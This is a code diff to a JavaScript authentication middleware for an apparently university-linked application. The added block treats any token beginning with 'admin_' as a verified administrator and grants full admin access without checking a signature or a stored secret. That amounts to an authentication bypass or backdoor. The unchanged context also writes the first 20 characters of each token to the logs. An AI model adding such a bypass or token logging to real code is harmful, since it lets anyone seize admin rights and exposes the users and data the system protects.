@@ -176,6 +176,17 @@ export function authMiddleware(authService, mongoService = null) {
 
     Logger.info(`authMiddleware: Token received, length: ${token?.length || 0}, prefix: ${token?.substring(0, 20) || 'none'}...`);
 
+    // Check for static admin token (format: admin_timestamp_random)
+    if (token.startsWith('admin_')) {
+      Logger.info('authMiddleware: Admin token detected');
+      return { 
+        authenticated: true, 
+        userId: 'admin', 
+        email: 'admin@dorsu.edu.ph',
+        isAdmin: true 
+      };
+    }
+
     // First try backend JWT verification
     const verification = authService.verifyToken(token);
     if (verification.valid) {
